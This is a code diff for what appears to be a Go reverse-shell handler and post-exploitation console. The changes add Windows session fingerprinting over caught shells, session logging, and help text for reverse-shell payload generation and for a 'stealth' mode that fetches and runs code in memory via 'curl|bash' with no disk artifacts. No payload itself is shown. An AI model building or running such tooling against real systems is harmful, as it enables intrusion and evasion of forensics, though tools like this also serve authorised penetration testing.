 						if !((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
-							(c >= '0' && c <= '9') || c == '-' || c == '_') {
+							(c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.') {
 							isValidHostname = false
 							break
 						}
@@ -1337,13 +1479,13 @@ func (m *Manager) detectSessionInfo(session *SessionInfo) {
 					}
 				}
 
-				// 3. Se temos ambos, combina em user@hostname
+				// 3. Combine user@hostname
 				if windowsUser != "" && windowsHostname != "" && !foundWhoami {
 					session.Whoami = fmt.Sprintf("%s@%s", windowsUser, windowsHostname)
 					foundWhoami = true
 				}
 			} else if (detectedPlatform == "linux" || detectedPlatform == "unknown") && !foundWhoami {
-				// Linux: formato user@hostname
+				// Linux: user@hostname format
 				if strings.Contains(line, "@") {
 					if !strings.Contains(line, "echo") &&
 						!strings.Contains(line, "whoami") &&
@@ -1351,28 +1493,23 @@ func (m *Manager) detectSessionInfo(session *SessionInfo) {
 						!strings.Contains(line, "$") &&
 						!strings.Contains(line, "%") {
 
-						// Valida formato básico: palavra@palavra
 						parts := strings.Split(line, "@")
 						if len(parts) == 2 && len(parts[0]) > 0 && len(parts[1]) > 0 && len(line) < 50 {
 							session.Whoami = line
 							foundWhoami = true
-							detectedPlatform = "linux" // Se achou formato Linux, é Linux
+							detectedPlatform = "linux"
 							session.Platform = "linux"
 							foundPlatform = true
-						} else {
 						}
-					} else {
 					}
 				}
 			}
 
-			// Se encontrou ambos, drena restante e termina IMEDIATAMENTE
+			// Found both - drain remaining and return
 			if foundWhoami && foundPlatform {
-				// Drena o restante SINCRONAMENTE (importante!)
-				// Isso garante que quando Start() é chamado, não há mais output de detecção
-				time.Sleep(100 * time.Millisecond) // Reduzido de 200ms
+				time.Sleep(100 * time.Millisecond)
 				drainBuffer := make([]byte, 4096)
-				session.Conn.SetReadDeadline(time.Now().Add(300 * time.Millisecond)) // Reduzido de 500ms
+				session.Conn.SetReadDeadline(time.Now().Add(300 * time.Millisecond))
 				for {
 					n, err := session.Conn.Read(drainBuffer)
 					if err != nil || n == 0 {
@@ -1380,17 +1517,102 @@ func (m *Manager) detectSessionInfo(session *SessionInfo) {
 					}
 				}
 				session.Conn.SetReadDeadline(time.Time{})
-				return // Sai IMEDIATAMENTE
+				return
+			}
+		}
+	}
+
+	session.Conn.SetReadDeadline(time.Time{})
+
+	// Phase 4: Fallback retry for Windows "unknown" whoami (10 second window)
+	if detectedPlatform == "windows" && !foundWhoami {
+		// Retry with explicit whoami and hostname commands
+		session.Conn.Write([]byte("whoami\r\n"))
+		time.Sleep(2 * time.Second)
+		session.Conn.Write([]byte("hostname\r\n"))
+		time.Sleep(2 * time.Second)
+
+		retryBuffer := make([]byte, 4096)
+		retryData := ""
+
+		for i := 0; i < 6; i++ {
+			session.Conn.SetReadDeadline(time.Now().Add(1 * time.Second))
+			n, err := session.Conn.Read(retryBuffer)
+			if err != nil {
+				if len(retryData) > 0 {
+					break
+				}
+				continue
+			}
+			retryData += string(retryBuffer[:n])
+		}
+		session.Conn.SetReadDeadline(time.Time{})
+
+		// Parse retry data
+		normalized := strings.ReplaceAll(retryData, "\r\n", "\n")
+		normalized = strings.ReplaceAll(normalized, "\r", "\n")
+		retryLines := strings.Split(normalized, "\n")
+
+		for _, line := range retryLines {
+			line = strings.TrimSpace(line)
+
+			if windowsUser == "" && strings.Contains(line, "\\") {
+				extracted := line
+				if strings.Contains(line, ">") {
+					parts := strings.Split(line, ">")
+					extracted = strings.TrimSpace(parts[len(parts)-1])
+				}
+				if strings.Contains(extracted, "\\") &&
+					!strings.Contains(extracted, "PS ") &&
+					!strings.Contains(extracted, ">") &&
+					len(extracted) > 3 && len(extracted) < 50 {
+					parts := strings.Split(extracted, "\\")
+					if len(parts) == 2 && len(parts[0]) > 0 && len(parts[1]) > 0 {
+						windowsUser = parts[1]
+					}
+				}
+			}
+
+			if windowsHostname == "" &&
+				!strings.Contains(line, "\\") &&
+				!strings.Contains(line, ">") &&
+				!strings.Contains(line, "PS ") &&
+				!strings.Contains(line, "C:") &&
+				len(line) > 0 && len(line) < 50 {
+
+				isValid := true
+				for _, c := range line {
+					if !((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
+						(c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.') {
+						isValid = false
+						break
+					}
+				}
+				if isValid {
+					windowsHostname = line
+				}
 			}
 		}
 
-		// NÃO dorme entre tentativas - desperdiça tempo!
-		// O timeout de Read já controla o timing
+		if windowsUser != "" && windowsHostname != "" {
+			session.Whoami = fmt.Sprintf("%s@%s", windowsUser, windowsHostname)
+			foundWhoami = true
+		} else if windowsUser != "" {
+			session.Whoami = windowsUser + "@unknown"
+			foundWhoami = true
+		}
+
+		// Drain remaining
+		drainBuffer := make([]byte, 4096)
+		session.Conn.SetReadDeadline(time.Now().Add(300 * time.Millisecond))
+		for {
+			n, err := session.Conn.Read(drainBuffer)
+			if err != nil || n == 0 {
+				break
+			}
+		}
+		session.Conn.SetReadDeadline(time.Time{})
 	}
-
-	// Remove timeout
-	session.Conn.SetReadDeadline(time.Time{})
-
 
 	if !foundWhoami {
 		session.Whoami = "unknown"
@@ -1454,6 +1676,13 @@ func (m *Manager) ShellSession() error {
 
 	fmt.Println(ui.Info("Entering interactive shell"))
 	fmt.Println(ui.CommandHelp("Press Ctrl-D to return to menu"))
+
+	// Initialize session logging (lazy init on first shell interaction)
+	if err := targetSession.InitLogFile(); err != nil {
+		fmt.Println(ui.Warning(fmt.Sprintf("Could not init session log: %v", err)))
+	} else if targetSession.LogFile != nil {
+		targetSession.Handler.SetLogWriter(targetSession.LogFile)
+	}
 
 	// Inicia shell handler (bloqueia até sair)
 	err := targetSession.Handler.Start()
@@ -1724,7 +1953,6 @@ func (m *Manager) showHelp() {
 	lines = append(lines, ui.CommandHelp("connect"))
 	lines = append(lines, ui.Command("rev [ip] [port]              - Generate reverse shell payloads"))
 	lines = append(lines, ui.Command("ssh user@host                - Connect via SSH and execute revshell"))
-	lines = append(lines, ui.Command("winrm                        - Connect via WinRM and execute revshell //TODO"))
 	lines = append(lines, "")
 
 	// Handler category
@@ -1745,7 +1973,7 @@ func (m *Manager) showHelp() {
 	// Modules category
 	lines = append(lines, ui.CommandHelp("modules"))
 	lines = append(lines, ui.Command("modules                      - List available modules"))
-	lines = append(lines, ui.Command("run <module> [args]          - Run a module (e.g., run enum, run lse)"))
+	lines = append(lines, ui.Command("run <module> [args]          - Run a module (e.g., run peas, run lse, run bin)"))
 	lines = append(lines, "")
 
 	// Config category
@@ -2049,7 +2277,11 @@ func (m *Manager) handleShowConfig() {
 
 	// Execution section
 	lines = append(lines, ui.CommandHelp("execution"))
-	lines = append(lines, ui.Command(fmt.Sprintf("mode: %s", rc.ExecutionMode)))
+	modeDesc := "stealth (in-memory: curl|bash, Reflection.Load)"
+	if rc.ExecutionMode == "speed" {
+		modeDesc = "speed (disk: SmartUpload → execute → shred)"
+	}
+	lines = append(lines, ui.Command(fmt.Sprintf("mode: %s", modeDesc)))
 	lines = append(lines, "")
 
 	// Binbag section
@@ -2099,6 +2331,8 @@ func (m *Manager) handleSet(args []string) {
 	case "mode":
 		if value != "stealth" && value != "speed" {
 			fmt.Println(ui.Error("Invalid mode. Use: stealth or speed"))
+			fmt.Println(ui.CommandHelp("  stealth = in-memory (curl|bash, Reflection.Load) - no disk artifacts"))
+			fmt.Println(ui.CommandHelp("  speed   = disk-based (SmartUpload → execute → shred) - for large binaries"))
 			return
 		}
 		if err := GlobalRuntimeConfig.SetExecutionMode(value); err != nil {
